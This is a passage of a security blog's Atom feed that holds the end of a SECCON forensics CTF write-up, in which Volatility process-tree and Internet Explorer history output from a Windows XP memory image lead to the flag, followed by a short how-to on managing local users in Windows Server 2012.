class="line">..... 0x82062b20:wuauclt.exe                          488   1036      7    132 2016-12-06 05:27:13 UTC+0000</div><div class="line">..... 0x81e56228:wscntfy.exe                          720   1036      1     37 2016-12-06 05:27:18 UTC+0000</div><div class="line">.... 0x82154880:vmacthlp.exe                          836    672      1     25 2016-12-06 05:27:08 UTC+0000</div><div class="line">.... 0x82151ca8:svchost.exe                           936    672     10    272 2016-12-06 05:27:08 UTC+0000</div><div class="line">.... 0x81e4b4b0:vmtoolsd.exe                          312    672      9    265 2016-12-06 05:27:13 UTC+0000</div><div class="line">.... 0x81f92778:svchost.exe                          1088    672      7     83 2016-12-06 05:27:08 UTC+0000</div><div class="line">.... 0x81f00558:VGAuthService.e                       196    672      2     60 2016-12-06 05:27:13 UTC+0000</div><div class="line">.... 0x81e18da0:svchost.exe                           848    672     20    216 2016-12-06 05:27:08 UTC+0000</div><div class="line">..... 0x81e89200:wmiprvse.exe                         596    848     12    255 2016-12-06 05:27:13 UTC+0000</div><div class="line">.... 0x81e41928:svchost.exe                          1320    672     12    183 2016-12-06 05:27:10 UTC+0000</div><div class="line">.... 0x81f0dbe0:spoolsv.exe                          1644    672     15    133 2016-12-06 05:27:10 UTC+0000</div><div class="line">.... 0x81f65da0:svchost.exe                          1776    672      2     23 2016-12-06 05:27:10 UTC+0000</div><div class="line">..... 0x8225bda0:IEXPLORE.EXE                         380   1776     22    385 2016-12-06 05:27:19 UTC+0000</div><div class="line">...... 0x8229f7e8:IEXPLORE.EXE                       1080    380     19    397 2016-12-06 05:27:21 UTC+0000</div><div class="line">.... 0x81e4f560:svchost.exe                          1704    672      5    107 2016-12-06 05:27:10 UTC+0000</div><div class="line">... 0x81f8c9a0:lsass.exe                              684    628     26    374 2016-12-06 05:27:07 UTC+0000</div><div class="line">.. 0x81ef6da0:csrss.exe                               604    540     11    480 2016-12-06 05:27:07 UTC+0000</div><div class="line"> 0x81e886f0:GoogleUpdate.ex                           372   1984      7    138 2016-12-06 05:27:13 UTC+0000</div></pre></td></tr></table></figure></p>
<p>We see a IEXPLORE.EXE. Why don't check its history ?</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">➜ volatility -f forensic_100.raw --profile=WinXPSP2x86 iehistory</div><div class="line">Volatility Foundation Volatility Framework 2.5</div><div class="line">**************************************************</div><div class="line">Process: 1080 IEXPLORE.EXE</div><div class="line">Cache type &quot;DEST&quot; at 0x201ca83</div><div class="line">Last modified: 2016-12-06 14:28:40 UTC+0000</div><div class="line">Last accessed: 2016-12-06 05:28:42 UTC+0000</div><div class="line">URL: SYSTEM@http://crattack.tistory.com/entry/Data-Science-import-pandas-as-pd</div><div class="line">Title: Security &amp;amp; Reverse :: [Data Science] Pandas - \),</div></pre></td></tr></table></figure></p>
<p>If we visit this URL without matching the IP adress in the host file, we are on a CTF site. There is no flag on this site...</p>
<p>But, if we match the IP adress with the URL, we have a file to download, and this file hold the flag :-)</p>
<p>Flag : SECCON{<em>h3110_w3_h4ve_fun_w4rg4m3</em>}</p>
<p><strong>Note</strong>: We could retrieve the IP adress with the connscan plugin, but it was impossible to determine that the <a href="http://crattack.tistory.com" target="_blank" rel="external">crattack.tistory.com</a> site was associated with this IP adress.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>Manage local users and groups on Windows Server 2012</title>
    <link href="http://rawsec.ml/en/manage-local-users-and-groups-on-windows-server-2012/"/>
    <id>http://rawsec.ml/en/manage-local-users-and-groups-on-windows-server-2012/</id>
    <published>2016-12-04T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:37.042Z</updated>
    
    <content type="html"><![CDATA[<ol>
<li>Open <strong>Server Manager</strong>.</li>
<li>Click <strong>Tools</strong>.</li>
<li>Select <strong>Computer Management</strong>.</li>
<li>Expand <strong>Local Users and Groups</strong>.</li>
<li>Select <strong>Users</strong> or <strong>Groups</strong>.</li>
<li>Double click on a user or a group.</li>
<li>Do your stuff.</li>
</ol>
<p><strong>Note</strong>: This works only for servers that are not Domain Controller (in this case just open <strong>Active Directory Users and Computer</strong>).</p>
]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;Open &lt;strong&gt;Server Manager&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Click &lt;strong&gt;Tools&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Select &lt;strong&gt;Computer Management&lt;/strong&gt;.&lt;
    
    </summary>
    
      <category term="windows" scheme="http://rawsec.ml/categories/windows/"/>
    
    
      <category term="windows" scheme="http://rawsec.ml/tags/windows/"/>
    
  </entry>
  
</feed>
